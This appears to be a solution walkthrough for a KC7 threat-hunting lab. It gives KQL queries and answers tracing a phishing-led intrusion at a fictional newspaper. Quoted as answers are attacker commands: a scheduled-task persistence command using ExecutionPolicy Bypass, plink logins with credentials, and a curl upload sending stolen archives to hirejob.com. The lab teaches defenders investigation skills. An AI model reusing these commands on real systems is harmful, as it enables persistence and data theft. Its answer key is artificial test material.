---
tags:
  - kc7
urls: https://kc7cyber.com/challenges/132
---
---

## SECTION 1: KQL 101

`1. Enter ready to get started!`

ANSWER: ready

`2. Type done to earn credit for this question.`

ANSWER: done

`3. How many employees work at the Valdorian Times?`
```
// Get the total number of employees
Employees 
| count
```
 ANSWER: 100

`4. What is the Editorial Director's name?`
```
// Get employees that have the "Editorial Director" role
Employees 
| where role == "Editorial Director"
```

ANSWER: Nene Leaks

`5. How many emails did Nene Leaks receive?`

```
// Get information about employee "Nene Leaks"
Employees
| where name == "Nene Leaks"
```
Grab the `email_addr` field to use as `recipient` in the Email query.

```
// Get count of emails that the employee "Nene Leaks" received
Email
| where recipient == "nene_leaks@valdoriantimes.news"
| count 
```
ANSWER: 18

`6. How many distinct senders were seen in the email logs from the domain name "weprinturstuff.com"?`
```
// Get count of distinct senders that have the "weprinturstuff.com" domain
Email
| where sender has "weprinturstuff.com"
| distinct sender
| count
```
ANSWER: 100

`7. How many distinct URLs did "Lois Lane" visit?`
```
// Get information about employee "Lois Lane"
Employees
| where name == "Lois Lane"
```
Grab the "ip_addr" to use as "src_ip" in the OutboundNetworkEvents query.

```
// Get distinct visited URLs from user "Lois Lane" using the IP
OutboundNetworkEvents
| where src_ip == "10.10.0.22"
| distinct url
| count
```
ANSWER: 62

`8. How many distinct domains in the PassiveDns records contain the word "hire"?`
```
// Get distinct domains that contain the word "hire" in the domain
PassiveDns
| where domain contains "hire"
| distinct domain
| count
```
ANSWER: 6

`9. What IPs did the domain “jobhire.org” resolve to (enter any one of them)?`
```
// Get the IP of the domain "jobhire.org"
PassiveDns
| where domain == "jobhire.org"
| distinct ip
```
ANSWER: 191.7.248.112

`10. How many distinct websites did employees with the first name "Mary" visit?`

Create a variable containing the IPs of the employees named Mary, then check what distinct webs they accessed:
```
// Create a variable containing the IP of employees named "Mary" then look for distinct web visit
let mary_ips =
Employees
| where name has "Mary"
| distinct ip_addr;
OutboundNetworkEvents
| where src_ip in (mary_ips)
| distinct url
| count
```
ANSWER: 58

`11. How many authentication attempts did we see to the accounts of employees with the first name Mary?`

Create a variable containing the names of the employees named Mary, then check their authentication attempts:
```
// Create a variable containing the username of employees named "Mary" then get a count of authentication attempts
let mary_employees =
Employees
| where name has "Mary"
| distinct username;
AuthenticationEvents
| where username in (mary_employees)
| count
```
ANSWER: 70

## SECTION 2: WELCOME TO VALDORIA!

`1. What is the Newspaper Printer's name?`

ANSWER: Clark Kent

`2. What is the Editorial Intern's name?`
```
// Get employees that have the "Editorial Intern" role
Employees
| where role == "Editorial Intern"
```

ANSWER: Ronnie McLovin

`3. When was the Editorial Intern hired at The Valdorian Times?`
```
// Get employees that have the "Editorial Intern" role
Employees
| where role == "Editorial Intern"
```

ANSWER: 2024-01-02 08:00:00+00:00

`4. How many total emails has Clark Kent received?`
```
// Get the total of emails the employee Clark Kent received
Email
| where recipient == "clark_kent@valdoriantimes.news"
| count
```

ANSWER: 21

`5. What was the subject line of this email?`

Use the date provided "January 31, 2024" to use in the query:
```
// Gets emails sent after the provided date
Email
| where recipient == "clark_kent@valdoriantimes.news"
| where timestamp > datetime(2024-01-31 00:00:00+00:00)
```

ANSWER: URGENT: Final OpEd Draft Edits (Please publish the following article in tomorrow's paper))

`6. Enter the sender's email address.`
```
SAME QUERY AS NUMBER 5
```

ANSWER: ronnie_mclovin@valdoriantimes.news

`7. What was the name of the .docx file that was sent in this email?`
```
SAME QUERY AS NUMBER 5
```
Look at the `link` parameter to retrieve the name of the file.

ANSWER: OpEdFinal_to_print.docx

`8. Do you think this needs further investigation (yes/no)? Choose wisely 😉`

ANSWER: yes

## SECTION 3: PLENTY OF PHISH

`1. What is Sonia's job role?`
```
// Get information about employees that have "Sonia" in their name
Employees
| where name has "Sonia"
```

ANSWER: Senior Editor

`2. What email address was used to send this email?`

ANSWER: newspaper_jobs@gmail.com

`3. When was the email sent to Sonia Gose? Enter the exact timestamp from the logs.`
```
// Get emails sent from "newspaper_jobs@gmail.com" to "sonia_gose@valdoriantimes.news"
Email
| where recipient == "sonia_gose@valdoriantimes.news"
| where sender == "newspaper_jobs@gmail.com"
```

ANSWER: 2024-01-05T09:42:05Z

`4. What URL was included in the email?`
```
// Get emails sent from "newspaper_jobs@gmail.com" to "sonia_gose@valdoriantimes.news"
Email
| where recipient == "sonia_gose@valdoriantimes.news"
| where sender == "newspaper_jobs@gmail.com"
```

ANSWER: https://promotionrecruit.com/published/Valdorian_Times_Editorial_Offer_Letter.docx

`5. What is Sonia Gose's IP address?`
``` 
// Get the IP address of the employee "Sonia Gose"
Employees
| where name == "Sonia Gose"
| project ip_addr
```

ANSWER: 10.10.0.3

`6. If so, enter the timestamp when she clicked the link. If not, type "no".`
```
// Get if the employee "Sonia Gose" with IP "10.10.0.3" clicked on the link
OutboundNetworkEvents
| where src_ip == "10.10.0.3"
| where url == "https://promotionrecruit.com/published/Valdorian_Times_Editorial_Offer_Letter.docx"
```

ANSWER:  2024-01-05T10:23:17Z

`7. What was the name of the docx file in the link that Sonia clicked?`

ANSWER: Valdorian_Times_Editorial_Offer_Letter.docx

`8. What is Sonia Gose's hostname?`
```
// Get the hostname of the computer of the employee "Sonia Gose"
Employees
| where name == "Sonia Gose"
| project hostname
```

ANSWER: UL0M-MACHINE

`9. When did the downloaded docx file first show up on Sonia's machine?`
```
// Get the date when the .docx file was downloaded in "Sonia's Gose" computer
FileCreationEvents
| where hostname == "UL0M-MACHINE"
| where filename == "Valdorian_Times_Editorial_Offer_Letter.docx"
| project timestamp
```

ANSWER: 2024-01-05T10:24:04Z

`10. What was the full path of the docx file that was downloaded to Sonia's machine?`
```
// Get the path of the .docx file in the host
FileCreationEvents
| where hostname == "UL0M-MACHINE"
| where filename == "Valdorian_Times_Editorial_Offer_Letter.docx"
| project path
```

ANSWER: C:\\\Users\\\sogose\\\Downloads\\\Valdorian_Times_Editorial_Offer_Letter.docx

`11. What is the sha256 hash of the file that Sonia downloaded?`
```
// Get the sha56 of the .docx file in the host
FileCreationEvents
| where hostname == "UL0M-MACHINE"
| where filename == "Valdorian_Times_Editorial_Offer_Letter.docx"
| project sha256
```

ANSWER: 60b854332e393a6a2f0015383969c3ac705126a6b7829b762057a3994967a61f

`12. What is the name of the file (.ps1) that was written to disk immediately after the docx was downloaded?`

Use the timestamp of the `.docx`
```
// Get files created in the given hostname after the given timestamp 
FileCreationEvents
| where hostname == "UL0M-MACHINE"
| where timestamp > datetime(2024-01-05 10:24:04+00:00)
```

ANSWER: hacktivist_manifesto.ps1

`13. When was this new file created?`
```
// Get the timestamp of the creation of the given filename in the given hostname
FileCreationEvents
| where hostname == "UL0M-MACHINE"
| where filename == "hacktivist_manifesto.ps1"
| project timestamp
```

ANSWER: 2024-01-05T10:24:32Z

`14. Let's do some research! What type of file is this?`

ANSWER: PowerShell script

`15. What does the attacker say to "let you know they are here"?`

ANSWER: lol ur bout 2 get pwnd...

`16. According to the PowerShell script, what might be the hacker's favorite color?`

ANSWER: Green

`17. The purpose of the script is to invoke ____ and uncover da truth`

ANSWER: plink

`18. How many Process Events are there related to this PowerShell script on Sonia's machine?`
```
// Gets processes related to the given file
ProcessEvents
| where hostname == "UL0M-MACHINE"
| where process_commandline contains "hacktivist_manifesto.ps1"
```

ANSWER: 3

`19. What is the full command used to create the scheduled task?`
```
// Gets processes information related to the given file
ProcessEvents
| where hostname == "UL0M-MACHINE"
| where process_commandline contains "hacktivist_manifesto.ps1"
```

ANSWER: schtasks /create /sc hourly /mo 5 /tn "Hacktivist Manifesto" /tr "powershell.exe -ExecutionPolicy Bypass -File C:\ProgramData\hacktivist_manifesto.ps1"

`20. What ExecutionPolicy is set in the command?

 ANSWER: Bypass

`21. What IP address is used when plink is executed?`
```
// Gets information related to the given process
ProcessEvents
| where hostname == "UL0M-MACHINE"
| where process_commandline contains "plink.exe"
```
Look in the `process_commandline`field to retrieve the IP.

ANSWER: 136.130.190.181

`22. What username did the attacker use when connecting via plink?`
```
// Gets information related to the given process
ProcessEvents
| where hostname == "UL0M-MACHINE"
| where process_commandline contains "plink.exe"
```
Look in the `process_commandline`field to retrieve the username.

ANSWER: $had0w

`23. What password did the attacker use when connecting via plink?`
```
// Gets information related to the given process
ProcessEvents
| where hostname == "UL0M-MACHINE"
| where process_commandline contains "plink.exe"
```
Look in the `process_commandline`field to retrieve the password.

ANSWER: thruthW!llS3tUfree

`24. What six-letter command did the attackers run to figure out which user they are logged on as on the computer?`

Use the timestamp of the execution of `plink.exe`:
```
// Gets processes run after the given timestamp
ProcessEvents
| where hostname == "UL0M-MACHINE"
| where timestamp > datetime(2024-01-06T02:39:35.000Z)
```

ANSWER: whoami

`25. How many discovery commands did the attackers run on this machine?`
```
// Gets processes run after the given timestamp
ProcessEvents
| where hostname == "UL0M-MACHINE"
| where timestamp > datetime(2024-01-06T02:39:35.000Z)
```

ANSWER: 5

`26. Do you think we can safely stop our investigation here? (yes/no)`

ANSWER: no

## SECTION 4: A SCANDAL

`1. How many total emails were sent by this email sender to users at The Valdorian Times?`
```
// Gets all emails sent my the specified sender
Email
| where sender == "valdorias_best_recruiter@gmail.com"
| count
```

ANSWER: 18

`2. When did valdorias_best_recruiter@gmail.com send an email to Ronnie McLovin?*`
```
// Gets information related to emails sent from the sender to the recipient
Email
| where sender == "valdorias_best_recruiter@gmail.com"
| where recipient == "ronnie_mclovin@valdoriantimes.news"
```

ANSWER:  2024-01-10T08:48:16Z

`3. What domain was in the link from that email?`
```
SAME QUERY AS NUMBER 2
```

ANSWER:  promotionrecruit.org

`4. What was the subject of that email?`
```
SAME QUERY AS NUMBER 2
```

ANSWER: [EXTERNAL] Breaking News: We're Hiring! Apply Now for Reporter Roles

`5. When did Ronnie click on the link in the email from valdorias_best_recruiter@gmail.com ?`

First grab Ronnie's IP:
```
// Gets the employee's IP
Employees
| where name has "Ronnie"
| project ip_addr
```

Then check if the IP accessed the URL:
```
// Gets if a IP tied to a employee accesed a URL
OutboundNetworkEvents
| where src_ip == "10.10.0.19"
| where url == "https://promotionrecruit.org/share/Editorial_J0b_Openings_2024.docx"
```

ANSWER: 2024-01-10 08:55:07+00:00

`6. What was the name of the .docx file that was downloaded to Ronnie's machine?`

ANSWER:  Editorial_J0b_Openings_2024.docx

`7. When was this docx file downloaded?`

First grab Ronnie's computer hostname:
```
// Gets the employee's computer hostname
Employees
| where name == "Ronnie McLovin"
| project hostname
```

Then use it to check for the download timestamp:
```
// Gets the download timestamp of a file
FileCreationEvents
| where hostname == "A37A-DESKTOP"
| where filename == "Editorial_J0b_Openings_2024.docx"
```

ANSWER: 2024-01-10T08:55:17Z

`8. When was the .ps1 file dropped to Ronnie's machine?`

Use the malicious file download timestamp to filter for dropped files in the computer:
```
// Gets processes run in specific hostname after timestamp
ProcessEvents
| where hostname == "A37A-DESKTOP"
| where timestamp > datetime(2024-01-10T08:55:17Z)
```

ANSWER: 2024-01-10T08:55:51Z

`9. What IP address was used with plink on Ronnie's machine?`
```
// Gets processes run in specific hostname after timestamp that contain "plink.exe"
ProcessEvents
| where hostname == "A37A-DESKTOP"
| where timestamp > datetime(2024-01-10T08:55:17Z)
| where process_commandline contains "plink.exe"
```

ANSWER: 168.57.191.100

`10. What username was used with plink on Ronnie's machine?`
```
SAME QUERY AS NUMBER 9
```

ANSWER: $had0w

`11. What password was used with plink on Ronnie's machine?`
```
SAME QUERY AS NUMBER 11
```

ANSWER: thruthW!llS3tUfree

`12. How many discovery commands were run on Ronnie's machine?`
```
// Gets processes run in specific hostname after timestamp where the parent process is "cmd.exe"
ProcessEvents
| where hostname == "A37A-DESKTOP"
| where timestamp > datetime(2024-01-10T08:55:17Z)
| where parent_process_name == "cmd.exe"
```

ANSWER: 5

`13. What is Ronnie's IP address?`
```
// Gets a specific employee's IP address
Employees
| where name has "Ronnie"
| project ip_addr
```

ANSWER: 10.10.0.19

`14. What is the full URL fakestory.docx was downloaded from?`
```
// Gets urls that contain "fakestory.docx" in the url
OutboundNetworkEvents
| where url contains "fakestory.docx"
```

ANSWER: https://hire-recruit.org/files/fakescandal/2024/fakestory.docx

`15. What is Ronnie's hostname?`
```
// Gets the hostname of a employee's computer
Employees
| where name == "Ronnie McLovin"
| project hostname
```

ANSWER: A37A-DESKTOP

`16. What is the sha256 hash of fakestory.docx on Ronnie's machine?`
```
// Gets details of a file in a specific computer
FileCreationEvents
| where hostname == "A37A-DESKTOP"
| where filename == "fakestory.docx"
```

ANSWER: 5f8a7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f

`17. When was fakestory.docx created on Ronnie's machine?`
```
SAME QUERY AS NUMBER 16
```

ANSWER:  2024-01-31T09:47:51Z

`18. What is the new path for the document?`
```
// Gets processes which command line contain "fakestory.docx"
ProcessEvents
| where hostname == "A37A-DESKTOP"
| where process_commandline contains "fakestory.docx"
```

ANSWER: C:\Users\romclovin\Documents\OpEdFinal_to_print.docx

`19. When was this command executed to rename and move the file?`
```
SAME QUERY AS NUMBER 18
```

ANSWER: 2024-01-31T10:26:20Z

`20. When was OpEdFinal_to_print.docx emailed from Ronnie's account to Clark Kent?`
Get the mail addresses of both employees:
```
// Gets the email address of multiple employees
Employees
| where name has_any ("Ronnie", "Clark")
| project email_addr
```

Use them to find the time the malicious mail was sent
```
// Gets mails sent from sender to recipient that the link have "OpEdFinal_to_print.docx"
Email
| where sender == "ronnie_mclovin@valdoriantimes.news"
| where recipient == "clark_kent@valdoriantimes.news"
| where link contains "OpEdFinal_to_print.docx"
```

ANSWER:  2024-01-31T11:11:12Z

`21. How many minutes elapsed between when the file was moved/renamed on Ronnie machine and when the email was sent to Clark Kent?`

Grab answer 19 and 20 and subtract:
```
  11:11:12
- 10:26:20
  --------
  00:44:52
```

ANSWER: 44

`22. What was the subject line of this email?`
```
SAME QUERY AS NUMBER 20
```

ANSWER: URGENT: Final OpEd Draft Edits (Please publish the following article in tomorrow's paper))

`23 Do you think this is the only thing the attackers did on Ronnie's machine? (yes/no)`

ANSWER: no

`24. What is the domain mentioned in this alert?`

ANSWER: hirerecruit.com

`25. How many total commands were run in this timeframe?`
```
// Gets command run in a specific computer between timestamps
ProcessEvents
| where timestamp between (datetime(2024-01-21 07:00:00) .. datetime(2024-01-21 12:00:00))
| where hostname == "A37A-DESKTOP"
| order by timestamp asc
```

ANSWER: 2

`26. What is the name of the .7z file that contains the stolen memes?`
```
// Gets processes in a specific computer after timestamp
ProcessEvents
| where hostname == "A37A-DESKTOP"
| where timestamp > datetime(2024-01-31T10:26:20Z)
```

ANSWER:  DankMemes.7z

`27. What is the name of the .7z file that contains files stolen from Ronnie's Documents folder?`
```
SAME QUERY AS NUMBER 26
```

ANSWER: MyStolenDataFromDocuments.7z

`28. What is the name of the .7z file that contains files stolen from Ronnie's Desktop folder?`
```
SAME QUERY AS NUMBER 26
```

ANSWER: MyStolenDataFromDesktop.7z

`29. What is the password the attackers used to encrypt all of the .7z files?`
```
SAME QUERY AS NUMBER 26
```

ANSWER: thruthW!llS3tUfree

`30. What is the full command the attackers ran to do this?`
```
SAME QUERY AS NUMBER 26
```

ANSWER: curl -F "file=@C:\Users\romclovin\Documents\*.7z" https://hirejob.com/exfil_processor/upload.php

`31. What domain was the stolen data uploaded to?`
```
SAME QUERY AS NUMBER 26
```

ANSWER: hirejob.com

`32. Was data stolen from any other devices and uploaded to hirejob.com? (yes/no)`

Simply check if there are more processes that mention the domain "hirejob.com"
```
// Gets any process command line that contains "hirejob.com"
ProcessEvents
| where process_commandline contains "hirejob.com"
```

ANSWER: no

`33. Type "wooo" to receive credit`

ANSWER: wooo

`34. Type "shadows" to finish this module. Stay tuned for the next module to learn more about what's lurking in the shadows 😱`

ANSWER: shadows